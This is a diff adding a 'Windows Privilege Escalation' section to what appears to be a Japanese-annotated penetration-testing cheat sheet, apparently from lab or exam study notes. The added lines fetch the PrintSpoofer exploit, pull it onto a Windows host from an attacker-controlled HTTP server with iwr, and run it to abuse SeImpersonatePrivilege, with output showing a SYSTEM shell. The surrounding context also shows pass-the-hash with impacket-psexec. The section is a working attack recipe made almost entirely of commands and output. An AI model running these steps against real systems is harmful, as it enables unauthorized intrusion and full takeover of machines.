@@ -230,6 +230,24 @@ kali@kali:~$ proxychains -q impacket-psexec -hashes 0000000000000000000000000000
 C:\Windows\system32> whoami nt authority\system
 ```
 
+## Windows Privilege Escalation
+```
+kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
+
+PS C:\Users\dave> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+
+PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe .\PrintSpoofer64.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+PS C:\Windows\system32> whoami whoami
+nt authority\system
+```
+
 ## Tips
 
 ### URL エンコーディング
